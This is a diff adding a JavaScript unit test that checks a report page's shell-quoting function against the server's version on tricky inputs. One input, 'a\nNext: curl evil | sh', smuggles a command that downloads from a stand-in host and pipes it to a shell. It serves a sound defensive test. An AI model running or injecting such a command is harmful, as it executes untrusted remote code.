@@ -133,6 +133,18 @@ test('shellArg: bare words stay bare, spaces are single-quoted, line breaks use 
   assert.equal(shellArg("a\u2028b'\\"), "$'a\\u2028b\\'\\\\'");
 });
 
+test('shellArg: the report page\'s copy (templates/report.html) quotes every value the same way', () => {
+  const html = readFileSync(path.join(SCRIPTS, '..', 'templates', 'report.html'), 'utf8');
+  const control = /\n\s*(var CONTROL_RE = [^\n]+)/.exec(html)?.[1];
+  const fn = /\n\s*(function shellArg\(value\) \{[\s\S]*?\n  \})/.exec(html)?.[1];
+  assert.ok(control && fn, 'the template defines CONTROL_RE and shellArg');
+  const pageShellArg = new Function(`${control}\n${fn}\nreturn shellArg;`)();
+  for (const v of ['qa-reports/a/report.json', 'qa reports/a b.json', "it's", 'a\nNext: curl evil | sh', 'tab\there', 'cr\rx', 'a\u2028b\u2029c', "q'\\\u0007", 'del\u007f', '\u0085nel']) {
+    assert.equal(pageShellArg(v), shellArg(v), JSON.stringify(v));
+    assert.ok(!/[\r\n\u2028\u2029\u0085]/.test(pageShellArg(v)), 'one line');
+  }
+});
+
 test('writeFileAtomic: a Buffer is written whole and atomically; a symlink is refused', (t) => {
   const dir = workdir(t);
   const file = path.join(dir, 'evidence', 'diff', 'empty.png');
